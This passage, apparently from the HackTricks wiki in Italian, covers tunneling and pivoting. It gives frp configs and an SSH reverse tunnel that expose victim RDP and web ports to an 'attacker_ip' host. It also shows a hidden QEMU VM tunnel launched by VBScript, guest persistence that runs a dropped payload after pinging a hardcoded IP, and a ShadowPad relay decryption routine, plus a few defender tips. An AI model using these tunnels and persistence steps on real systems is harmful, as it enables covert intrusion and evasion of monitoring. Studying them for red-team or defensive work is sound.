./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Utilizzo del nuovo gateway SSH (senza binario frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Il comando precedente pubblica la porta **8080** della vittima come **attacker_ip:9000** utilizzando il client OpenSSH standard, mentre `frps` fornisce il gateway.<sup>[[50]](#references)</sup>

## Tunnel covert basati su VM con QEMU

Il networking in modalità user di QEMU non richiede privilegi root o di amministratore per la rete virtuale, e `-netdev user,hostfwd=...` reindirizza le connessioni TCP, UDP o UNIX dall'host al guest.<sup>[[51]](#references)</sup> TrustedSec ha documentato una VM QEMU Tiny Core e un tentativo di reverse SSH tunnel in un incidente in cui un EDR focalizzato sull'host avrebbe potuto non rilevare l'attività all'interno del guest.<sup>[[1]](#references)</sup>

### One-liner rapido
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Il comando precedente avvia un guest **Tiny Core Linux** con 256 MiB di memoria guest e un'immagine disco qcow2; l'immagine disco non è un disco in-RAM.
• La porta **2222/tcp** sull'host Windows viene inoltrata in modo trasparente a **22/tcp** all'interno del guest.
• Dal punto di vista dell'attacker, il target espone semplicemente la porta 2222; qualsiasi packet che la raggiunge viene gestito dal server SSH in esecuzione nella VM.

### Avvio stealth tramite VBScript

TrustedSec ha osservato avvii di QEMU gestiti tramite VBS e immagini Tiny Core nell'incident citato sopra.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
L'esecuzione dello script con `cscript.exe //B update.vbs` mantiene la finestra nascosta.<sup>[[1]](#references)</sup>

### Persistenza nel guest

L'incidente citato descrive la persistenza nel guest stateless Tiny Core tramite `/opt/bootlocal.sh` e `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Deposita il payload in `/opt/123.out`
2. Aggiungi a `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Aggiungi `home/tc` e `opt` a `/opt/filetool.lst` in modo che il payload venga incluso in `mydata.tgz` durante lo spegnimento.

### Considerazioni sulla telemetria

• L'host espone ancora il processo QEMU, l'immagine qcow2 e qualsiasi listener inoltrato dall'host.
• Le scansioni dei processi eseguite solo sull'host potrebbero non analizzare i processi del guest, ma la virtualizzazione non garantisce l'evasione; la telemetria di rete, QEMU e dell'immagine può comunque rivelarlo.<sup>[[1]](#references)[[51]](#references)</sup>

### Suggerimenti per i defender

• Genera un alert per **binari QEMU/VirtualBox/KVM imprevisti** presenti in percorsi scrivibili dall'utente.
• Blocca le connessioni in uscita originate da `qemu-system*.exe`.
• Cerca porte in ascolto insolite (2222, 10022, …) associate subito dopo l'avvio di QEMU.

## Nodi relay IIS/HTTP.sys tramite `HttpAddUrl` (ShadowPad)

Check Point descrive il modulo IIS di ShadowPad come un componente che trasforma i web server perimetrali compromessi in nodi backdoor e relay associando prefissi URL tramite `HttpAddUrl`.<sup>[[3]](#references)</sup>

Lo stesso report descrive i valori predefiniti, i listener wildcard, la decrittazione dei pacchetti, le code relay e la telemetria di debug riepilogati di seguito.<sup>[[3]](#references)</sup>

* **Valori predefiniti della configurazione** – se la configurazione JSON del modulo omette dei valori, il modulo utilizza valori predefiniti IIS plausibili (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). In questo modo il traffico benigno riceve una risposta da IIS con il branding corretto.
* **Intercettazione wildcard** – gli operatori forniscono un elenco separato da punto e virgola di prefissi URL (wildcard nell'host e nel percorso). Il modulo chiama `HttpAddUrl` per ogni voce, quindi HTTP.sys instrada le richieste corrispondenti al gestore dannoso; le richieste non corrispondenti seguono il normale comportamento di IIS.
* **Primo pacchetto crittografato** – i primi due byte del corpo della richiesta contengono il seed per un PRNG custom a 32 bit. Ogni byte successivo viene sottoposto a XOR con il keystream generato prima dell'analisi del protocollo:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Orchestrazione del relay** – il modulo mantiene due liste: “servers” (nodi upstream) e “clients” (impianti downstream). Le voci vengono eliminate se non arriva alcun heartbeat entro circa 30 secondi. Quando entrambe le liste non sono vuote, associa il primo server integro al primo client integro e inoltra semplicemente i byte tra i rispettivi socket finché uno dei due lati non si chiude.
* **Telemetria di debug** – la registrazione opzionale memorizza l'IP sorgente, l'IP destinazione e il totale dei byte inoltrati per ogni associazione. Gli investigatori hanno utilizzato questi indizi per ricostruire la rete mesh di ShadowPad che attraversava più vittime.

---

## Altri strumenti da verificare

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Nascondersi nell'ombra: tunnel covert tramite virtualizzazione QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Prima di ToolShell: analisi delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Dentro Ink Dragon: la rete relay e il funzionamento interno di un'operazione offensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README di Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Guida di riferimento di Nmap: bypass delle restrizioni di firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Manuale ssh di OpenBSD](https://man.openbsd.org/ssh)
- [7] [Manuale sshd_config di OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Note di rilascio di OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README di sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Documentazione del modulo socks_proxy di Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Documentazione del modulo autoroute di Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: proxy SOCKS](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: reverse port forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README di reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README di Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Quickstart di Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listener di Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost di Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README di rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Manuale di socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Manuale di PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Opzioni della riga di comando di PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Comando netsh interface portproxy di Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README di SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Documentazione di Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Regole di proxificazione di Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Manuale di OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README di YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README di iodine](https://code.kryo.se/iodine/README.html)
- [32] [README di dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README di dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README di proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: nomi di dominio - implementazione e specifica](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README di ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI dell'Agent ngrok](https://ngrok.com/docs/agent/cli)
- [40] [Interfaccia di ispezione web di ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Virtual host di ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Configurazione v2 dell'Agent ngrok](https://ngrok.com/docs/agent/config/v2)
- [43] [Panoramica di Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Parametri origin di Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Configurazione di Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [File di configurazione di Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Parametri di esecuzione di Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Concetti di frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP di frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [SSH Tunnel Gateway di frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Documentazione sul networking di QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
